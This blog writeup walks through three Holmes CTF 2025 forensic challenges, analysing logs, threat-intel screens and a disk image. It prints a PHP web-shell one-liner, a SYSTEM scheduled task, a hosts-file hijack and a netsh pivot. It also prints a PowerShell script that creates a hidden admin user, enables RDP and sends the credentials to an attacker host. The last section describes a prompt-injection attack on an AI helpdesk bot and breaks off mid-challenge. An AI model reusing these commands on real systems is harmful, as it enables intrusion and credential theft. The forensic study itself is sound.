---
title: "Holmes CTF 2025"
date: 2025-09-27T14:20:00+07:00
draft: false
categories: ["CTF", "writeup"]
cover: "/images/holmes_2025/the_card/anh1.png"
---

# Holmes CTF 2025 – The Card

![Challenge Banner](/images/holmes_2025/the_card/anh1.png)

Holmes CTF 2025 Event Link: https://ctf.hackthebox.com/event/2536  
Challenge name: **The Card**  
Difficulty: **Easy**  
Describe: Holmes receives a breadcrumb from Dr. Nicole Vale – fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.

--- 

## Question 1  
Analyze the provided logs and identify what is the first User-Agent used by the attacker against Nicole Vale's honeypot. (string)

*From the provided snippet of the access.log, we can see the following entry:
```velocity
2025-05-01 08:23:12 121.36.37.224 - - [01/May/2025:08:23:12 +0000] 
"GET /robots.txt HTTP/1.1" 200 847 "-" "Lilnunc/4A4D - SpecterEye"
```

Breaking it down:
Timestamp: 2025-05-01 08:23:12  
Source IP: 121.36.37.224 (attacker)  
Request: GET /robots.txt HTTP/1.1  
Response code: 200 (successful request)  
User-Agent: "Lilnunc/4A4D - SpecterEye"  

Since this is the earliest recorded request from the attacker, the User-Agent value clearly indicates the tool or script they were using.

Conclusion:  
```velocity
Lilnunc/4A4D - SpecterEye
```

---

## Question 2:  
It appears the threat actor deployed a web shell after bypassing the WAF. What is the file name? (filename.ext)

Log Analysis:
1. Application log evidence
In application.log, we see that the attacker successfully deployed a backdoor web shell:
```velocity
2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by 121.36.37.224 - command: 'echo "&lt;?php system($_GET["cmd"]); ?&gt;" > /var/www/html/uploads/temp_4A4D.php'
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by 121.36.37.224
```

This shows the exact filename and path of the malicious PHP web shell: `/uploads/temp_4A4D.php`

2. Access log confirmation
Later, the attacker starts interacting with the uploaded file:
```velocity
2025-05-18 15:02:12 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=ls -la /var/www/html/uploads/" ...
2025-05-18 15:02:23 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=whoami" ...
2025-05-18 15:02:34 121.36.37.224 "GET /uploads/temp_4A4D.php?cmd=tar -czf /tmp/exfil_4A4D.tar.gz /var/www/html/config/ /var/log/webapp/" ...
```

Here we clearly see the attacker executing system commands (ls, whoami, tar) through the PHP web shell.

3. WAF log observation
The WAF also detected this malicious activity but shows that the attacker bypassed protections:
```velocity
2025-05-15 11:25:12 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - PHP web shell temp_4A4D.php created
```

Conclusion:  
```velocity
temp_4A4D.php
```

---

## Question 3:  
The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated? (filename.ext)

Log Analysis:
1. Access log evidence
From the access.log, we can see the attacker downloading a large SQL file:
```velocity
2025-05-18 14:58:23 121.36.37.224 - - [18/May/2025:15:58:23 +0000] 
"GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800 "-" "4A4D RetrieveR/1.0.0"
```

This indicates a successful download of the file `database_dump_4A4D.sql`.

2. Application log confirmation
The application log also records this exfiltration attempt:
```velocity
2025-05-18 14:58:23 [CRITICAL] webapp.security - Database dump accessed - database_dump_4A4D.sql downloaded by 121.36.37.224
```

3. WAF log validation
Finally, the WAF confirms the event, showing the attacker bypassed protections:
```velocity
2025-05-18 14:58:23 [CRITICAL] waf.exec - IP 121.36.37.224 - Rule: DATABASE_DOWNLOAD - Action: BYPASS - Database file download: database_dump_4A4D.sql
```

Conclusion:  
```velocity
database_dump_4A4D.sql
```

---

## Question 4:  
During the attack, a seemingly meaningless string seems to be recurring. Which one is it? (string)

Log Analysis:
Reviewing the logs across different stages of the attack, one specific string keeps showing up:
- User-Agent: `Lilnunc/4A4D - SpecterEye`  
- Web shell filename: `temp_4A4D.php`  
- Exfiltrated files: `backup_2025_4A4D.tar.gz`, `database_dump_4A4D.sql`, `config_4A4D.json`  
- Backdoor & persistence mechanisms: `/tmp/.system_update_4A4D`, SSH key named `backdoor_4A4D`

Across reconnaissance, exploitation, persistence, and exfiltration, the attacker consistently embeds the same marker.

Conclusion:  
```velocity
4A4D
```

---

## Question 5:  
OmniYard-3 (formerly Scotland Yard) has granted you access to its CTI platform. Browse to the first IP:port address and count how many campaigns appear to be linked to the honeypot attack.

![CTI Graph](/images/holmes_2025/the_card/anh2.png)

Analysis:
1. Accessing the CTI platform
We were given three possible Docker instances to investigate:
http://94.237.51.202:31849/
http://94.237.51.202:52486/
http://94.237.51.202:40489/
The first one (:31849) loads the CogWork-Intel Graph interface, as shown in the screenshot.
2. Entity types and connections
In the graph view, different types of entities are shown with unique colors:
-Campaigns (red)
-Infrastructure, Indicators, Malware, Tools, Organizations, etc.
3. Identifying the honeypot attack link
On the left, we see an Investigation Alert:
-“JM signature (4A4D) detected across multiple breach campaigns. Investigate entity connections for attribution patterns.”
-This confirms the platform has associated the attacker’s recurring marker (4A4D) with several campaigns.
4. Counting campaigns
Looking at the graph:
-The entity labeled JM (center node, related to Nicole Vale’s honeypot) is connected to five red nodes.
-Each red node corresponds to a campaign entity.
-This means the CTI platform has correlated the honeypot attack with five separate campaigns.
Conclusion:
The honeypot attack is linked to:
```velocity
5
```

---

## Question 6:  
How many tools and malware in total are linked to the previously identified campaigns? (number)
-Analysis:
1. From Question 5, we already identified that the honeypot attack (JM signature 4A4D) is linked to 5 campaigns.
2. In the CogWork-Intel Graph view (screenshot of http://94.237.51.202:31849/), each campaign node (red) has connections to other entities such as:
- Tools (brown)
- Malware (dark red)
3. By counting all the tools and malware linked to those 5 campaigns, we get a total of 9 entities.
Conclusion:
The total number of tools and malware linked to the identified campaigns is:
```velocity
9
```

---

## Question 7:  
It appears that the threat actor has always used the same malware in their campaigns. What is its SHA-256 hash? (sha-256 hash)
Analysis:
1. In the CogWork-Intel Graph view (http://94.237.51.202:31849/), selecting the malware indicator entity (indicator--bio-falsifier-hash-2025-0004) reveals its details.
2. On the right-hand side under Description and Properties, we see the malware identified as BioMetric Falsifier targeting medical monitoring systems.
3. The Pattern field provides the hash value:
```velocity
{file:hashes.SHA256 = '7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477'}
```
![Malware Hash](/images/holmes_2025/the_card/anh3.png)

This confirms the SHA-256 hash of the recurring malware.
Conclusion:
```velocity
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```

---

## Question 8:  
Browse to the second IP:port address and use the CogWork Security Platform to look for the hash and locate the IP address to which the malware connects. (Credentials: nvale/CogworkBurning!)
Analysis:
1. Accessing the platform
When logging into the second instance (http://94.237.51.202:52486/) with the provided credentials, we can search for the malware hash previously identified in Question 7:
```velocity
7477c4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d17477
```
2. Detailed malware analysis
The malware is shown as neurostorm_implant_4A4D.bin with the following attributes:
File Type: ELF 64-bit executable
Detections: 45/72 engines flagging it as malicious
Attribution: James Moriarty–themed attacks
Campaign ID: 4A4D-NEUROSTORM
3. Critical infrastructure
Scrolling down in the analysis view, under Critical C2 Infrastructure, we find the following entry:
```velocity
74.77.74.77
Primary Command & Control Server
Ports: 443, 8080, 4444
```
This identifies the IP address the malware communicates with.
Conclusion:
```velocity
74.77.74.77
```

---

## Question 9:  
What is the full path of the file that the malware created to ensure its persistence on systems? (/path/filename.ext)

![Persistence Evidence](/images/holmes_2025/the_card/anh4.png)  
Analysis:
From the CogWork Security Platform – Behavioral Analysis section, we can observe the malware’s activity:

*Network Activity

-HTTPS → 74.77.74.77:443
-TCP → 74.77.74.77:7474 (Backdoor listener port)
-TCP → 74.77.74.77:8080 (Secondary C2 channel)
-DNS → 4a4d-nullinc.revenge.onion (Tor hidden service)

*File Operations

```velocity
CREATE → /opt/lilnunc/implant/4a4d_persistence.sh   (21:46:30 20/7/2025)
CREATE → /etc/lilnunc/4a4d_config.xml               (21:46:45 20/7/2025)
```
![Persistence File](/images/holmes_2025/the_card/anh5.png)

*Registry Operations
- MODIFY → /etc/rc.local
Conclusion:
```velocity
/opt/lilnunc/implant/4a4d_persistence.sh
```

---

## Question 10:  
Finally, browse to the third IP:port address and use the CogNet Scanner Platform to discover additional details about the TA's infrastructure. How many open ports does the server have?

![Open Ports](/images/holmes_2025/the_card/anh6.png)

Analysis:
1. Accessing the platform
Navigating to the third instance (http://94.237.51.202:40489/) loads the CogNet Scanner interface.

2. Searching for the C2 server
We query the previously identified C2 IP address:74.77.74.77

3. Scan results
The scanner flags the host and displays its details:
-Location: United Kingdom (CogWork-1 Networks)
-Role: Enterprise Management Server
-Status: Flagged as malicious

4. Open ports
The result lists the following services:

```velocity
22/tcp    ssh
25/tcp    smtp
53/udp    dns
80/tcp    http
110/tcp   pop3
143/tcp   imap
443/tcp   https
3389/tcp  rdp
7477/tcp  unknown
8080/tcp  http-proxy
8443/tcp  https-alt

Counting them gives a total of 11 open ports.

Conclusion:
```velocity
11
```

---

## Question 11:  
Which organization does the previously identified IP belong to? (string)

![Organization Evidence](/images/holmes_2025/the_card/anh7.png)

Analysis:

1. From Question 10, we identified the threat actor’s C2 server as 74.77.74.77.

2. Using the CogNet Scanner Platform (http://94.237.51.202:40489/), the Overview tab of the scan results provides network information.

3. The details show:
- IP Address: 74.77.74.77
- Device Type: Enterprise Management Server
- Operating System: Ubuntu Server 18.04 LTS
- Hostname: msp-sense-33.local
- Organization: SenseShield MSP
Thus, the organization linked to the IP is SenseShield MSP.
Conclusion:
```velocity
SenseShield MSP
```
Conclusion:  
```velocity
SenseShield MSP
```

---

## Question 12:  
One of the exposed services displays a banner containing a cryptic message. What is it? (string)

![Service Banner](/images/holmes_2025/the_card/anh8.png)

Analysis:

1. Using the CogNet Scanner Platform (http://94.237.51.202:40489/), we switched to the Services tab to review banners from all detected open ports.

2. Most services displayed standard banners (e.g., OpenSSH, Postfix SMTP, Dovecot POP3/IMAP, nginx).

3. However, the service running on port 7477/tcp (unknown service) revealed a unique banner containing a cryptic phrase:He's a ghost I carry, not to haunt me, but to hold me 
together - NULLINC REVENGE

Conclusion:

```velocity
He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
```
# Holmes CTF 2025 – The Enduring Echo

Challenge name:**The Enduring Echo**
Difficulty:**Easy**
Describe:LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.
## Question 1:
What was the first (non cd) command executed by the attacker on the host? (string)

**Evidence & where it was found**

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh1.png)

- I located the process creation event in the Windows Security log (Event ID 4688 — A new process has been created).
- The NewProcessName is C:\Windows\System32\cmd.exe
- The CommandLine field for this event is:

```velocity
cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
```
- That command line shows cmd.exe launching systeminfo and redirecting its output (1>) to \\127.0.0.1\ADMIN$\__1756075857.955773, with stderr (2>&1) merged into stdout.

**Interpretation**

1. The first non-cd command executed by the attacker was systeminfo. The presence of cmd.exe /Q /c systeminfo confirms systeminfo is the actual command the attacker ran.

2. systeminfo is a common reconnaissance command — it prints operating system and system configuration information (OS version, build, installed hotfixes, hardware info, boot time, etc.). Attackers often run it early to learn system details (OS build, domain membership, etc.) that help plan next steps or choose appropriate exploits/tools.

3. The redirection portion 1> \\127.0.0.1\ADMIN$\__1756075857.955773 is notable:

- The attacker attempted to write the command output to a network path (an SMB share). \\127.0.0.1\ADMIN$ would target the local host’s administrative share — this pattern can indicate an attempt to exfiltrate output via SMB, stage files, or simply to persist output somewhere accessible.
- The use of 127.0.0.1 is odd if the intent was remote exfiltration (127.0.0.1 resolves to localhost). It could mean: a misuse/mistake, an attempt to avoid detection by writing to the admin share via loopback, or the attacker was running the same command through a lateral- or proxy-type setup where 127.0.0.1 is meaningful in that context (for example, a pivoted session).

4. Parent process (ParentProcessName) is C:\Windows\System32\wbem\WmiPrvSE.exe. That strongly suggests the systeminfo invocation was launched by the WMI Provider Host process — typical when a remote WMI command was used (remote command execution via WMI) or when a scheduled/remote management task invoked cmd.exe. This indicates remote execution through WMI or a WMI-based management tool rather than an interactive local console.

**Why this matters**

1. Running systeminfo early is consistent with discovery activity. Combined with the fact it was launched by WmiPrvSE.exe and redirected to an admin share, this event indicates the attacker was performing automated discovery and trying to capture results in a location accessible to their process.
2. This event is a helpful starting point for an investigation: it gives the first clear indicator of attacker activity (a specific command and its redirection), and it suggests a remote vector (WMI) to investigate further.

**onclusion:**

The first User-Agent used by the attacker is:
```velocity
systeminfo
```
## Question 2: 
Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
-Similarly, in question 1, the answer is

**Conclusion:**

```velocity
C:\Windows\System32\wbem\WmiPrvSE.exe
```
## Question 3:
Which remote-execution tool was most likely used for the attack? (filename.ext)

**Conclusion:**

```velocity
wmiexec.py
```

**Evidence & where it was found**

1. The parent process spawning the attacker’s commands is C:\Windows\System32\wbem\WmiPrvSE.exe (WMI Provider Host), and the first observed command line was cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1.

2. The combination of:

- remote process creation via the WMI provider host,
- execution of standard shell commands via cmd.exe, and
- output redirection to an ADMIN$ share
strongly points to a WMI-based remote execution technique.

3. wmiexec.py (from the Impacket tools) is a well-known utility that performs remote command execution via WMI and produces the exact behavioral pattern: it creates processes on the remote host through WMI (which show up with WmiPrvSE.exe as the parent) and often uses redirection or temporary files to capture command output.

**Why wmiexec.py (and not other tools)**

1. Behavioral match: wmiexec.py uses the WMI services to spawn processes remotely. When you run wmiexec.py against a target, the remote host will typically show WmiPrvSE.exe as the parent of the spawned cmd.exe process in Event ID 4688 records. That exact parent-child relationship is present in your logs.

2. Simplicity & output handling: wmiexec.py captures stdout/stderr from commands executed remotely. Attackers often redirect outputs to ADMIN$ or other shares as part of their workflow; this is consistent with the 1> \\127.0.0.1\ADMIN$\__... 2>&1 redirection we saw.

3. Alternatives considered: Other remote-exec tools (e.g., psexec.py, smbexec, native wmic, winrm, or PowerShell remoting) also cause remote process creation, but:

- psexec variants typically use the Service Control Manager (showing services.exe/svchost involvement) rather than WmiPrvSE.exe.
- wmic may show similar parentage, but wmic is a built-in client and often appears differently in logs and in how output is handled.
- PowerShell remoting uses WinRM and different service parents (e.g., winrm.exe/svchost), and often shows powershell.exe command lines including -EncodedCommand.

4. Given the concrete evidence (WMI parent process + cmd-based commands + admin-share output capture) the most likely third-party tool used is wmiexec.py. This is a classic and common tool used in red team and attacker toolkits for WMI-based remote execution.

**Interpretation (attack context)**

1. The attacker used WMI to execute reconnaissance commands (systeminfo) remotely. This is typically an early post-exploitation step to profile the host and confirm access.

2. Using wmiexec.py provides a non-interactive, stealthy channel to run commands without an interactive shell, which reduces noise and leaves a trail primarily in event logs (4688) rather than interactive user logs.

## Question 4: 
What was the attacker’s IP address? (IPv4 address)

**Evidence & where it was found**

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh2.png)

1. I examined the relevant Windows Security Event (Event ID 4688 — A new process has been created).

2. The CommandLine field in that event contains:

```velocity
cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
```

3. This command clearly contains the IPv4 address 10.129.242.110 which the attacker wrote into the local hosts file along with the hostname NapoleonsBlackPearl.htb.

**Interpretation**

1. The attacker executed a simple echo redirection to append a line to the system hosts file. The line being appended maps the hostname NapoleonsBlackPearl.htb to the IP 10.129.242.110.

2. This is a local DNS override technique: by inserting the mapping into C:\Windows\System32\drivers\etc\hosts, the attacker ensures that any process on the host resolving NapoleonsBlackPearl.htb will get 10.129.242.110 instead of using the network DNS.

3. Common motivations for this action:

- Command-and-control (C2) reachability — forcing the hostname to point to an attacker-controlled IP so malware or scripts can contact it directly.
- Credential harvesting / redirecting legitimate services — causing calls to an internal or external named resource to reach an attacker-controlled host.
- Phishing / tooling convenience — making it easier to access a lab or named host without DNS changes.

4. The technique is low-noise and persistent (survives reboots) until someone edits the hosts file, so it’s often used by attackers to ensure a reliable mapping.

**Context from other events**

1. The parent process for this cmd.exe invocation was C:\Windows\System32\cmd.exe (i.e., a command shell), and earlier events showed WMI (WmiPrvSE.exe) as the creator of shell commands — together these indicate the host was being controlled remotely (likely via wmiexec.py or another WMI-based tool) and used to modify the hosts file.

**Why this matters**

1. Manipulating the hosts file is a clear sign of attempted environment manipulation by the attacker. Even if the IP 10.129.242.110 is an internal address (the 10. prefix is private), it's important because it shows where the attacker wants traffic to go from the compromised host.

2. If the attacker’s infrastructure resides at that IP (or if it points to another compromised machine), it may be part of lateral movement or an internal rendezvous point for malware.

**Conclusion:**

```velocity
10.129.242.110
```

## Question 5:
What is the first element in the attacker's sequence of persistence mechanisms? (string)

**Evidence & where it was found**

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh3.png)

1. I inspected the relevant Windows Security Event (Event ID 4688 — A new process has been created).

2. The CommandLine field shows the attacker created a scheduled task:

```velocity
schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f
```
3. The NewProcessName is C:\Windows\System32\schtasks.exe and the ParentProcessName is C:\Windows\System32\cmd.exe, so the command shell created the scheduled task using schtasks.exe.

4. The task name is explicitly "SysHelper Update" — this is the persistence artifact name the attacker chose.

**Interpretation**

1. The attacker used schtasks.exe to create a scheduled task named SysHelper Update that runs a PowerShell script (JM.ps1) from the user’s AppData folder.

2. Details from the command line:

- /sc minute /mo 2 — the task is scheduled to run every 2 minutes (very frequent), indicating the attacker wanted a reliably persistent, near-continuous execution.
- /ru SYSTEM — the task runs as SYSTEM, giving it high privileges.
- ExecutionPolicy Bypass -WindowStyle Hidden — these flags are typical when attackers try to run PowerShell scripts stealthily and avoid execution policy controls.
/f forces creation/overwriting of the task if it exists.

3. This scheduled task is a classic persistence technique: it ensures the malicious script is executed repeatedly and with elevated privileges even after reboots or user logoffs.

**Why this matters**  

1. As the first observed persistence element, SysHelper Update likely represents the initial mechanism the attacker installed to maintain access to the host.

2. Because it runs as SYSTEM and executes a script from a user-writable folder (C:\Users\Werni\Appdata\Local\JM.ps1), it provides a highly reliable foothold and a convenient location for the attacker to update or swap the payload.

3. The extremely short interval (every 2 minutes) suggests the attacker intended near-continuous control or wanted rapid re-establishment if their payload was terminated.

**Conclusion:**

```velocity
SysHelper Update
```
## Question 6:
Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)

-Similarly, in question 5, the answer is

**Conclusion:**

```velocity
C:\Users\Werni\Appdata\Local\JM.ps1
```

## Question 7:
What local account did the attacker create? (string)

**Evidence & where it was found**

1. Windows Security log (Event ID 4720 — User Account Created):

- he XML view of the 4720 event shows TargetUserName = svc_netupd. This is a direct event that records the creation of a local user account. The presence of this field is authoritative evidence the account was created on the host.

2. Malicious script JM.ps1 (recovered from C:\Users\Werni\AppData\Local\JM.ps1):

- The script contains:

```velocity
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh3.png)

-and logic that checks for existing users and, if none exist, picks one at random:
-That shows the script’s intent: create a user from that list, add it to the Administrators and Remote Desktop Users groups.

3. Correlation

- The scheduled task SysHelper Update (created earlier) runs JM.ps1 every 2 minutes as SYSTEM. That task + the script explain why the user creation event occurred and why svc_netupd (one of the candidate names) was created.

**Interpretation**

1. svc_netupd was created by the attacker as a local service-style account. The script intentionally:

- Generates a randomized password (Watson_<timestamp>),
- Creates the user with a plausible service name (Windows Update Helper),
- Escalates privileges by adding the account to the Administrators group, and
- Adds it to Remote Desktop Users and enables RDP, facilitating remote interactive access.

2. The account name svc_netupd is consistent with the script’s naming scheme designed to blend in (service-like names).

3. The attacker also attempts to exfiltrate credentials by encoding the <username>|<password> pair in Base64 and calling:

```velocity
http://NapoleonsBlackPearl.htb/Exchange?data=<base64>
```
So not only was the account created, its credentials were likely sent to the attacker-controlled host.
**Conclusion:**
```velocity
svc_netupd
```
## Question 8: 
What domain name did the attacker use for credential exfiltration? (domain)

**Evidence & where it was found**

- The malicious PowerShell script JM.ps1 recovered from C:\Users\Werni\AppData\Local\JM.ps1 contains this line near the end of the script:
```velocity
Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
```
- This shows the script explicitly sends the newly created account and password (concatenated as <username>|<password> and then base64-encoded) to the /Exchange endpoint on the host NapoleonsBlackPearl.htb.
- Complementary evidence: an earlier command appended an entry to the hosts file:
```velocity
cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
```
This maps NapoleonsBlackPearl.htb to 10.129.242.110, ensuring that the HTTP request in the script resolves to that IP.

**Interpretation**

- The attacker used NapoleonsBlackPearl.htb as the exfiltration domain. The script builds a base64-encoded payload containing the created username and password and sends it via HTTP to http://NapoleonsBlackPearl.htb/Exchange.
- Modifying the local hosts file to point that domain to 10.129.242.110 ensures the request reaches the intended infrastructure even if DNS would not resolve the name normally — a common tactic when using internal lab or private infrastructure.
- This pattern (local hosts mapping + HTTP exfiltration) indicates the attacker wanted reliable delivery of credentials to their collection server and likely used that server to harvest credentials and coordinate further activity.

**Conclusion:**
```velocity
NapoleonsBlackPearl.htb
```
## Question 9: 
What password did the attacker's script generate for the newly created user? (string)

**Evidence & where it was found**

1 . Malicious script (JM.ps1) — recovered from C:\Users\Werni\AppData\Local\JM.ps1:
The script contains these lines (paraphrased):

```velocity
$timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
$password = "Watson_$timestamp"
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
New-LocalUser -Name $newUser -Password $securePass ...
```

- This shows the password is formed by concatenating the literal Watson_ with a timestamp string in the format yyyyMMddHHmmss.

2. Windows Security event timestamp — Event metadata shown in the Event Viewer XML includes:

```velocity
<TimeCreated SystemTime="2025-08-24T23:05:09.7646587Z" />
<EventData>
  <Data Name="TargetUserName">svc_netupd</Data>
  ...
</EventData>
```
- This event corresponds to the account creation (TargetUserName svc_netupd). The SystemTime value is in UTC.

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh5.png)
3. Timezone / timestamp adjustment — The forensic view of the host shows the system time zone is Pacific Time (ActiveTimeBias 420), which is UTC−07:00. Converting the UTC event time 2025-08-24T23:05:09Z to local Pacific time gives 2025-08-24 16:05:09. Formatting that local time as yyyyMMddHHmmss produces 20250824160509. Prepending Watson_ yields the final password: Watson_20250824160509.

**Conclusion:**
```velocity
Watson_20250824160509
```
## Question 10:
 What was the IP address of the internal system the attacker pivoted to? (IPv4 address)

**Evidence & where it was found**

- he Windows Security Event (Event ID 4688 — A new process has been created) shows the attacker executed netsh.exe.
- The CommandLine field contains:

```velocity
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
```
![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh6.png)

- This command explicitly sets up a port forwarding rule that forwards local traffic on port 9999 (listening on all interfaces 0.0.0.0) to 192.168.1.101:22 (SSH on the internal host). The connectaddress=192.168.1.101 value is the pivot target.

**Interpretation**

- The attacker created a portproxy using netsh to forward traffic from the compromised host to an internal machine at 192.168.1.101. Traffic connecting to the compromised host on port 9999 will be forwarded to port 22 on that internal IP — effectively providing remote access to the internal host via the compromised machine (a common pivoting technique).
- listenaddress=0.0.0.0 makes the proxy listen on all network interfaces, so the attacker (or other systems) can reach the forwarded SSH port from anywhere that can reach the compromised host.
- Because the forwarded target port is 22 (SSH), the goal was almost certainly to provide remote SSH access to the internal host without direct network access to it — i.e., tunneling/pivoting.

**Conclusion:**
```velocity
192.168.1.101
```
## Question 11: 
Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)

-Similarly, in question 10, the answer is
**Conclusion:**
```velocity
9999
```
## Question 12:
 What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)

**Analysis**

- When attackers configure port forwarding on a Windows host using the command:
```velocity
netsh interface portproxy add v4tov4 listenport=... listenaddress=... connectport=... connectaddress=...
```
- these settings are not just temporary. They are saved in the Windows Registry so they survive reboots.
- The relevant registry hive is under the Services\PortProxy key. Specifically, for IPv4 → IPv4 TCP forwarding, Windows stores the persistent rules in the following path:

**Conclusion:**
```velocity
HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```
## Question 13:
 What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)

**Analysis**

1. From Question 12, we determined the attacker configured persistent port forwarding using the Windows netsh interface portproxy feature. This technique allows them to redirect traffic from one IP/port to another, enabling lateral movement or pivoting into internal systems

2. According to the MITRE ATT&CK framework:

- The tactic is Defense Evasion / Lateral Movement.
- The technique is Proxy: External Proxy.
- The specific sub-technique for port forwarding / port proxying is:

**Conclusion:**
```velocity
T1090.001
```
## Question 14: 
Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)

**Evidence & where it was found**

- In the forensic output (ConsoleHost_history and other collected text artifacts shown in Autopsy), the command appears verbatim among the recorded administrator commands. The extracted text window includes the reg add invocation used to enable command-line capture.
- Additional contextual evidence: subsequent security events (Event ID 4688) in the provided logs contain full CommandLine fields for cmd.exe/powershell.exe invocations, showing that command-line auditing was indeed active when the attacker executed commands.
Interpretation
- The reg add command writes a DWORD value named ProcessCreationIncludeCmdLine_Enabled with value 1 into the registry path:

```velocity
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
- Setting this value to 1 enables Windows’ feature to include process command-line information in process creation audit records (4688). In modern Windows versions this is one of the steps required so that the Security log records full command lines for spawned processes.
- This change makes process creation events significantly richer — instead of only seeing NewProcessName (the binary path), the CommandLine field will contain the exact arguments and commands executed. That is exactly how you were able to see the attacker’s full command lines (for example, the echo ... >> hosts line, netsh interface portproxy and the scheduled task creation).
Why this matters
- From a defensive perspective, enabling command-line auditing is highly valuable — it transforms event logs from coarse indicators into actionable forensic evidence. In this case 
it allowed investigators to identify attacker TTPs (WMI remote execution, scheduled tasks, hosts file manipulation, portproxy pivoting) with concrete command strings and arguments.
- From an operational perspective, organizations should balance the value of detailed logging with storage and privacy considerations (command lines can include sensitive data). The registry change is a deliberate, system-level switch and should be documented and monitored.
- Attackers are less likely to hide their behavior when command-line logging is enabled — it makes post-compromise detection and attribution much easier.

![Organization Evidence](/images/holmes_2025/the_enduring_echo/anh7.png)

**Conclusion:**
```velocity
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
```
# Holmes CTF 2025 – The Watchman's Residue

Challenge name: **The Watchman's Residue**  
Difficulty: **Medium**  
Describe: With help from D.I. Lestrade, Holmes acquires logs from a compromised MSP connected to the city’s financial core. The MSP’s AI servicedesk bot looks to have been manipulated into leaking remote access keys - an old trick of Moriarty’s.

## Question 1:
What was the IP address of the decommissioned machine used by the attacker to start a chat session with MSP-HELPDESK-AI? (IPv4 address)
- First, open the provided pcap file and check for HTTP POST requests by applying the display filter http.request.method == "POST" in Wireshark to view the chat sessions. We observed two IP addresses: 10.32.43.31 and 10.0.69.45. Upon checking the frame numbers, the first IP (10.32.43.31) started a chat session at frame 389, while the second IP (10.0.69.45) started at frame 1465. Based on frame 3154, we observed that 10.0.69.45 is suspicious, and it was the IP address of the decommissioned machine.
![images](/images/holmes_2025/the_watchman_residue/anh1.png)
**Conclusion:**
```velocity
10.0.69.45
```
## Question 2:
What was the hostname of the decommissioned machine? (string)
- Use the Wireshark display filter ip.addr == 10.0.69.45, and we observed the hostname
![images](/images/holmes_2025/the_watchman_residue/anh2.png)
**Conclusion:**
```velocity
WATSON-ALPHA-2
```
## Question 3:
What was the first message the attacker sent to the AI chatbot? (string)
- Use the Wireshark display filter ip.addr == 10.0.69.45 && http.request.method == "POST" to display only the connections from the suspicious host.
![image](https://hackmd.io/_uploads/SyBVLnL3gl.png)
**Conclusion:**
```velocity
Hello Old Friend
```
## Question 4:
When did the attacker's prompt injection attack make MSP-HELPDESK-AI leak remote management tool info? (YYYY-MM-DD HH:MM:SS)
